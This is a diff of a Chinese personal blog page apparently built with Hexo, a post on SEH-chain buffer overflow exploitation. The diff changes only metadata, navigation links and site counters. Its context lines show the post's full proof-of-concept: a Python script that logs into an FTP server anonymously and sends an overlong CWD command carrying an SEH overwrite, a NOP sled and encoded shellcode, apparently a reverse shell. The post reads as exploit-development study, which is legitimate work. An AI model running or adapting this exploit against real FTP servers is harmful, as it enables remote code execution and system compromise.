@@ -96,7 +96,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/05/05/利用SEH链的缓冲区溢出/示意图.png">
 <meta property="og:image" content="http://yoursite.com/2020/05/05/利用SEH链的缓冲区溢出/monaseh.png">
 <meta property="og:image" content="http://yoursite.com/2020/05/05/利用SEH链的缓冲区溢出/反弹.png">
-<meta property="og:updated_time" content="2020-12-05T02:52:54.440Z">
+<meta property="og:updated_time" content="2022-04-24T01:11:44.357Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用SEH链的缓冲区溢出">
 <meta name="twitter:description" content="关于SEH的介绍，有一篇外国大佬的文章写的很清晰。链接是：Windows Exploit Development – Part 6: SEH Exploits请允许我介绍部分贴来这位前辈的。 注：基于SEH异常链栈远程溢出的一个经典例子，python2运行，在winxp sp3下调试">
@@ -396,7 +396,6 @@
 <p>最终poc：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'192.168.1.138'</span>,<span class="number">21</span>))</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b""</span></span><br><span class="line">shellcode += <span class="string">b"\xdb\xca\xb8\x7e\x23\xd2\xd4\xd9\x74\x24\xf4"</span></span><br><span class="line">shellcode += <span class="string">b"\x5b\x31\xc9\xb1\x52\x31\x43\x17\x03\x43\x17"</span></span><br><span class="line">shellcode += <span class="string">b"\x83\x95\xdf\x30\x21\x95\xc8\x37\xca\x65\x09"</span></span><br><span class="line">shellcode += <span class="string">b"\x58\x42\x80\x38\x58\x30\xc1\x6b\x68\x32\x87"</span></span><br><span class="line">shellcode += <span class="string">b"\x87\x03\x16\x33\x13\x61\xbf\x34\x94\xcc\x99"</span></span><br><span class="line">shellcode += <span class="string">b"\x7b\x25\x7c\xd9\x1a\xa5\x7f\x0e\xfc\x94\x4f"</span></span><br><span class="line">shellcode += <span class="string">b"\x43\xfd\xd1\xb2\xae\xaf\x8a\xb9\x1d\x5f\xbe"</span></span><br><span class="line">shellcode += <span class="string">b"\xf4\x9d\xd4\x8c\x19\xa6\x09\x44\x1b\x87\x9c"</span></span><br><span class="line">shellcode += <span class="string">b"\xde\x42\x07\x1f\x32\xff\x0e\x07\x57\x3a\xd8"</span></span><br><span class="line">shellcode += <span class="string">b"\xbc\xa3\xb0\xdb\x14\xfa\x39\x77\x59\x32\xc8"</span></span><br><span class="line">shellcode += <span class="string">b"\x89\x9e\xf5\x33\xfc\xd6\x05\xc9\x07\x2d\x77"</span></span><br><span class="line">shellcode += <span class="string">b"\x15\x8d\xb5\xdf\xde\x35\x11\xe1\x33\xa3\xd2"</span></span><br><span class="line">shellcode += <span class="string">b"\xed\xf8\xa7\xbc\xf1\xff\x64\xb7\x0e\x8b\x8a"</span></span><br><span class="line">shellcode += <span class="string">b"\x17\x87\xcf\xa8\xb3\xc3\x94\xd1\xe2\xa9\x7b"</span></span><br><span class="line">shellcode += <span class="string">b"\xed\xf4\x11\x23\x4b\x7f\xbf\x30\xe6\x22\xa8"</span></span><br><span class="line">shellcode += <span class="string">b"\xf5\xcb\xdc\x28\x92\x5c\xaf\x1a\x3d\xf7\x27"</span></span><br><span class="line">shellcode += <span class="string">b"\x17\xb6\xd1\xb0\x58\xed\xa6\x2e\xa7\x0e\xd7"</span></span><br><span class="line">shellcode += <span class="string">b"\x67\x6c\x5a\x87\x1f\x45\xe3\x4c\xdf\x6a\x36"</span></span><br><span class="line">shellcode += <span class="string">b"\xc2\x8f\xc4\xe9\xa3\x7f\xa5\x59\x4c\x95\x2a"</span></span><br><span class="line">shellcode += <span class="string">b"\x85\x6c\x96\xe0\xae\x07\x6d\x63\x11\x7f\x6c"</span></span><br><span class="line">shellcode += <span class="string">b"\x08\xf9\x82\x6e\xfb\x4a\x0b\x88\x69\xbd\x5a"</span></span><br><span class="line">shellcode += <span class="string">b"\x03\x06\x24\xc7\xdf\xb7\xa9\xdd\x9a\xf8\x22"</span></span><br><span class="line">shellcode += <span class="string">b"\xd2\x5b\xb6\xc2\x9f\x4f\x2f\x23\xea\x2d\xe6"</span></span><br><span class="line">shellcode += <span class="string">b"\x3c\xc0\x59\x64\xae\x8f\x99\xe3\xd3\x07\xce"</span></span><br><span class="line">shellcode += <span class="string">b"\xa4\x22\x5e\x9a\x58\x1c\xc8\xb8\xa0\xf8\x33"</span></span><br><span class="line">shellcode += <span class="string">b"\x78\x7f\x39\xbd\x81\xf2\x05\x99\x91\xca\x86"</span></span><br><span class="line">shellcode += <span class="string">b"\xa5\xc5\x82\xd0\x73\xb3\x64\x8b\x35\x6d\x3f"</span></span><br><span class="line">shellcode += <span class="string">b"\x60\x9c\xf9\xc6\x4a\x1f\x7f\xc7\x86\xe9\x9f"</span></span><br><span class="line">shellcode += <span class="string">b"\x76\x7f\xac\xa0\xb7\x17\x38\xd9\xa5\x87\xc7"</span></span><br><span class="line">shellcode += <span class="string">b"\x30\x6e\xb7\x8d\x18\xc7\x50\x48\xc9\x55\x3d"</span></span><br><span class="line">shellcode += <span class="string">b"\x6b\x24\x99\x38\xe8\xcc\x62\xbf\xf0\xa5\x67"</span></span><br><span class="line">shellcode += <span class="string">b"\xfb\xb6\x56\x1a\x94\x52\x58\x89\x95\x76"</span></span><br><span class="line"></span><br><span class="line">nseh=<span class="string">b"\xeb\x0e\x90\x90"</span></span><br><span class="line">seh=<span class="string">b"\x1e\x40\x20\x12"</span></span><br><span class="line"></span><br><span class="line">offset=<span class="number">1037</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*offset+nseh+seh+<span class="string">"\x90"</span>*<span class="number">30</span>+shellcode+<span class="string">'b'</span>*<span class="number">1000</span></span><br><span class="line"></span><br><span class="line">poststr=payload</span><br><span class="line"></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'USER anonymous'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'PASS anonymous'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'CWD '</span> + poststr+ <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">data = s.recv(<span class="number">4096</span>)</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'QUIT'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">s.close</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2020/05/05/利用SEH链的缓冲区溢出/反弹.png" alt></p>
 <p>测试程序跳转精准，但是把1000个b替换成shellcode就出错了，沧桑.jpg。</p>
-<p>下一篇更新：egghunter技术</p>
 
       
     </div>
@@ -429,8 +428,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/05/01/eggseh/" rel="next" title="eggseh（随手记的，还未整理）">
-                <i class="fa fa-chevron-left"></i> eggseh（随手记的，还未整理）
+              <a href="/2020/04/14/复变函数中i的来历/" rel="next" title="复变函数中i的几何意义">
+                <i class="fa fa-chevron-left"></i> 复变函数中i的几何意义
               </a>
             
           </div>
@@ -520,7 +519,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -531,7 +530,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -542,7 +541,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-count">63</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -595,7 +594,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
